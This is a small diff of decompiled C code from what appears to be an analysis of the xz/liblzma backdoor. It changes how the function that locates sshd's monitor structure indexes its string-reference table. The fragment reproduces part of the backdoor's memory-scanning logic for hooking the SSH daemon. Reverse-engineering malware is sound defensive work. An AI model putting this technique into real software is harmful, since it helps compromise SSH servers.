@@ -57,11 +57,11 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
         candidate_cursor = (void **)((long)candidate_cursor + (ulong)zero_seed * -8 + 4);
       }
       do {
-        code_start = (u8 *)refs->entries[monitor_vote_table[vote_idx]].func_start;
+        code_start = (u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_start;
         if (code_start != (u8 *)0x0) {
           sshd_find_monitor_field_addr_in_function
-                    (code_start,(u8 *)refs->entries[monitor_vote_table[vote_idx]].func_end,data_start,data_end,
-                     monitor_candidates + vote_idx,ctx);
+                    (code_start,(u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_end,
+                     data_start,data_end,monitor_candidates + vote_idx,ctx);
         }
         vote_idx = vote_idx + 1;
       } while (vote_idx != 10);
